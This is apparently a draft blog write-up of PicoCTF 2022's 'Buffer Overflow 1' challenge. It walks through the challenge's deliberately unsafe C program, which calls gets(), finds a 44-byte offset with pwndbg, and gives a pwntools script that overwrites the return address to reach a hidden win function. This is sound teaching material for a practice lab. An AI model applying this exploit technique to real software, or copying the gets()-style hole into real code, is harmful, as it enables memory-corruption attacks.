---

title: "Buffer Overflow 1"
date: 2023-08-22T19:48:58+08:00
author: John Wu
summary: "PicoCTF 2022's buffer overflow 1 writeup"
ShowToc: true
draft: true

---

## Given Stuff

Problem:

Control the return address. Additional details will be available after launching your challenge instance.

Hints:
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.


```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

`vuln`

## Tools
- GDB/pwndbg
- python3
- pwntools
- System: Linux 6.4.11-arch2-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux

## Analysis
Make the `vuln` file executable first: `chmod +x vuln`.
Open the project in GDB for analyzing: `gdb vuln`.
From the source code, we see that there is a function `win` that is never called by `main` or `vuln`.
However, because it is still in the code and for the sake of the challenge, the program will still load `win` onto the stack.
```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

So, find the location of `win`.

```
pwndbg> info functions win
All functions matching regular expression "win":

Non-debugging symbols:
0x080491f6  win
pwndbg>
```

So `win` is located at 0x080491f6, and since this is a buffer overflow problem, we just have to set $eip to 0x080491f6.

The vulnerability in the code is in the function `vuln`, because of the use of `gets()`.
So lets find out the buffer size in order to overflow the stack.

```
pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
pwndbg> r <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
Starting program: /home/hyperboly/Downloads/bufover1/vuln <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*EAX  0x41
*EBX  0x6161616a ('jaaa')
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 (__libc_csu_init) ◂— endbr32 
*EBP  0x6161616b ('kaaa')
*ESP  0xffffd4e0 ◂— 0x6161616d ('maaa')
*EIP  0x6161616c ('laaa')
─────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────────────
Invalid address 0x6161616c

pwndbg>
```

`cyclic` from pwntools is available in pwndbg.
It basically creates a recognizable pattern that we can use to find where in the stack a 4 byte pattern exists.

[more resources](https://en.wikipedia.org/wiki/De_Bruijn_sequence), [and more](https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences)

`r <<< <de-bruijn-sequences>` just means `run` the program, and input the de-bruijn-sequence.
The register $eip is now laaa, so we just have to find the offset of "laaa" to find how many bytes we need to overflow the eip.

```
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
pwndbg>
```

The pattern is at offset 44, so we can just append where `win` is in memory after 44 bytes which we know is at 0x080491f6.
So to put that into a python script with pwntools:
```python
# solve.py
from pwn import *

payload = b"A" * 44 + p32(0x80491f6)
target = remote('saturn.picoctf.net', 61303)

log.info(target.recvline())
target.sendline(payload)
log.info(target.recvall())

target.close()
```

Note that we can't send the raw 0x80491f6 because it's not in little endian, so we have to use the `p32()` function [docs](https://docs.pwntools.com/en/stable/util/packing.html)
We also can't send in the raw "A" because thats also not a byte, so we have to prepend `b""` to it, which in python means "turn it into bytes."

We can check locally by sending this into GDB:

```sh
pwndbg> r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08")
Starting program: /home/hyperboly/Downloads/bufover1/vuln <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{flag}

Program received signal SIGSEGV, Segmentation fault.
```
